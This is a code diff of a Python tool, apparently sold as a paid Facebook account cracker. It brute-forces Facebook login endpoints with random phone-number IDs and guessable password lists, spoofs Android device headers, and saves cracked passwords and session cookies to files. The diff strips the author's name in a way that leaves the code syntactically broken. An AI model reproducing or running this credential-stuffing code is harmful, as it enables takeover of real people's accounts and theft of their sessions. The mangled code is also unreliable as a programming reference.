@@ -11,7 +11,7 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python SALMANXESHO.py')
+	os.system('python .py')
 	
 print('[•] Follow My Account')
 os.system('xdg-open https://hhttps://www.facebook.com/zia.mian?')
@@ -138,6 +138,7 @@ device = {
         'fbca':fbca,
         'fbdm':fbdm}
 
+logo=("""\033[1;91m
   /$$$$$$        /$$$$$$$$
  /$$__  $$      | $$_____/
 | $$  \__/      | $$      
@@ -148,10 +149,10 @@ device = {
  \______/       |________/
                            XD
 \033[1;37m--------------------------------------------------
-[~] Author   : Salman x Esho
+[~] Author   : salman x Esho
 [~] Facebook : salman x Esho
 [~] Tool     : Paid
-[~] Version  : 3.1
+[~] Version  : 2.1
 \033[1;37m----------------------------------------------""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -270,7 +271,7 @@ def menu():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python SALMANXESHO.py')
+				os.system('python .py')
 			elif xd in ['2','02']:
 				pak()
 			elif xd in ['3','03']:
@@ -306,7 +307,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as SALMANXESHO:	
+		with tred(max_workers=30) as :	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -332,24 +333,24 @@ def pak():
 				elif pcs in ['8','08']:
 					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
 				if mthd in ['1','01']:
-					SALMANXESHO.submit(SALMANXESHO1,ids,passlist)
+					.submit(1,ids,passlist)
 				if mthd in ['2','02']:
-					SALMANXESHO.submit(SALMANXESHO2,ids,passlist)
+					.submit(2,ids,passlist)
 				if mthd in ['3','03']:
-					SALMANXESHO.submit(SALMANXESHO3,ids,passlist)
+					.submit(3,ids,passlist)
 				if mthd in ['4','04']:
-					SALMANXESHO.submit(SALMANXESHO4,ids,passlist)
+					.submit(4,ids,passlist)
 				if mthd in ['5','05']:
-					SALMANXESHO.submit(SALMANXESHO5,ids,passlist)
+					.submit(5,ids,passlist)
 				if mthd in ['6','06']:
-					SALMANXESHO.submit(SALMANXESHO6,ids,passlist)
+					.submit(6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python SALMANXESHO.py')
+		os.system('python .py')
 
 def gmail():
 		os.system('rm -rf .re.txt')
@@ -390,7 +391,7 @@ def gmail():
 				mail = ''.join(random.choice(string.digits) for _ in range(4))
 				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as SALMANXESHO:
+		with tred(max_workers=30) as :
 			total = str(len(fo))
 			clear()
 			print(' Total ids : \033[1;32m'+total+f' ')
@@ -414,30 +415,30 @@ def gmail():
 				else:
 					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
 				if mthd in ['1','01']:
-					SALMANXESHO.submit(SALMANXESHO1,ids,passlist)
+					.submit(1,ids,passlist)
 				if mthd in ['2','02']:
-					SALMANXESHO.submit(SALMANXESHO2,ids,passlist)
+					.submit(2,ids,passlist)
 				if mthd in ['3','03']:
-					SALMANXESHO.submit(SALMANXESHO3,ids,passlist)
+					.submit(3,ids,passlist)
 				if mthd in ['4','04']:
-					SALMANXESHO.submit(SALMANXESHO4,ids,passlist)
+					.submit(4,ids,passlist)
 				if mthd in ['5','05']:
-					SALMANXESHO.submit(SALMANXESHO5,ids,passlist)
+					.submit(5,ids,passlist)
 				if mthd in ['6','06']:
-					SALMANXESHO.submit(SALMANXESHO6,ids,passlist)
+					.submit(6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python SALMANXESHO.py')
+		os.system('python .py')
 #b-api method
 #1method
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
@@ -502,18 +503,18 @@ def api1(ids,names,passlist):
 				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 				q = json.loads(po)
 				if 'session_key' in q:
-					print('\r\r\033[1;32m [SALMANXESHO-OK] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SALMANXESHO-OK.txt','a').write(ids+'|'+pas+'\n')
+					print('\r\r\033[1;32m [-OK] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [-CP] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
-						open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+						open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
 						break
 				else:
 					continue
@@ -527,7 +528,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -575,26 +576,26 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [SALMANXESHO-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/SALMANXESHO-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/SALMANXESHO-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[SALMANXESHO-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -606,7 +607,7 @@ def api2(ids,names,passlist):
 def api3(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -674,26 +675,26 @@ def api3(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [SALMANXESHO-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/SALMANXESHO-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/SALMANXESHO-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[SALMANXESHO-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -706,7 +707,7 @@ def api3(ids,names,passlist):
 def api4(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -775,23 +776,23 @@ def api4(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [SALMANXESHO-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SALMANXESHO-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[SALMANXESHO-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;206m [-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -803,7 +804,7 @@ def api4(ids,names,passlist):
 def api5(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -891,26 +892,26 @@ def api5(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [SALMANXESHO-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/SALMANXESHO-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/SALMANXESHO-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[SALMANXESHO-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SALMANXESHO-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -920,7 +921,7 @@ def api5(ids,names,passlist):
                 pass
 def api6(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -937,18 +938,18 @@ def api6(ids,names,passlist):
 			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SALMANXESHO=session.cookies.get_dict().keys()
-			if "c_user" in SALMANXESHO:
+			=session.cookies.get_dict().keys()
+			if "c_user" in :
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [SALMANXESHO-OK] %s | %s'%(ids,pas))
-				open('/sdcard/SALMANXESHO-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [-OK] %s | %s'%(ids,pas))
+				open('/sdcard/-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in SALMANXESHO:
+			elif 'checkpoint' in :
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SALMANXESHO-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -962,7 +963,7 @@ def api6(ids,names,passlist):
 #d.fb
 def api7(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -979,18 +980,18 @@ def api7(ids,names,passlist):
 			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SALMANXESHO=session.cookies.get_dict().keys()
-			if "c_user" in SALMANXESHO:
+			=session.cookies.get_dict().keys()
+			if "c_user" in :
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [SALMANXESHO-OK] %s | %s'%(ids,pas))
-				open('/sdcard/SALMANXESHO-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [-OK] %s | %s'%(ids,pas))
+				open('/sdcard/-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in SALMANXESHO:
+			elif 'checkpoint' in :
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SALMANXESHO-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1003,7 +1004,7 @@ def api7(ids,names,passlist):
 #method7
 def api8(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1020,18 +1021,18 @@ def api8(ids,names,passlist):
 			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SALMANXESHO=session.cookies.get_dict().keys()
-			if "c_user" in SALMANXESHO:
+			=session.cookies.get_dict().keys()
+			if "c_user" in :
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [SALMANXESHO-OK] %s | %s'%(ids,pas))
-				open('/sdcard/SALMANXESHO-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [-OK] %s | %s'%(ids,pas))
+				open('/sdcard/-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in SALMANXESHO:
+			elif 'checkpoint' in :
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SALMANXESHO-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1042,10 +1043,10 @@ def api8(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 #method1rnd
-def SALMANXESHO1(ids,passlist):
+def 1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1129,8 +1130,8 @@ def SALMANXESHO1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [SALMANXESHO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SALMANXESHO-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1140,8 +1141,8 @@ def SALMANXESHO1(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SALMANXESHO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1149,12 +1150,12 @@ def SALMANXESHO1(ids,passlist):
         except Exception as e:
                 pass
 
-def SALMANXESHO2(ids,passlist):
+def 2(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
 			application_version_code=str(random.randint(000000000,999999999))
 			__iam_genius = random.choice(android_models)
@@ -1210,13 +1211,13 @@ def SALMANXESHO2(ids,passlist):
 			q = json.loads(po)
 			if 'session_key' in q:
 				udx = str(q['uid'])
-				print('\r\r\033[1;32m [SALMANXESHO-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/SALMANXESHO-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				print('\r\r\033[1;32m [-OK] '+udx+' | '+pas+'\033[1;97m')
+				open('/sdcard/-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/SALMANXESHO-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\x1b[38;5;205m [-CP] '+ids+' | '+pas+'\033[1;97m')
+				open('/sdcard/-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -1228,10 +1229,10 @@ def SALMANXESHO2(ids,passlist):
 		print(e)
 #new method
                 
-def SALMANXESHO3(ids,passlist):
+def 3(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1304,11 +1305,11 @@ def SALMANXESHO3(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [SALMANXESHO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        #open('/sdcard/SALMANXESHO-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/SALMANXESHO-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        #open('/sdcard/-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1318,8 +1319,8 @@ def SALMANXESHO3(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SALMANXESHO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1327,10 +1328,10 @@ def SALMANXESHO3(ids,passlist):
         except Exception as e:
                 pass
 #method4
-def SALMANXESHO4(ids,passlist):
+def 4(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1399,11 +1400,11 @@ def SALMANXESHO4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [SALMANXESHO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/SALMANXESHO-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/SALMANXESHO-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1413,8 +1414,8 @@ def SALMANXESHO4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SALMANXESHO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1422,10 +1423,10 @@ def SALMANXESHO4(ids,passlist):
         except Exception as e:
                 pass
 #method5
-def SALMANXESHO5(ids,passlist):
+def 5(ids,passlist):
         global loop
         global oks
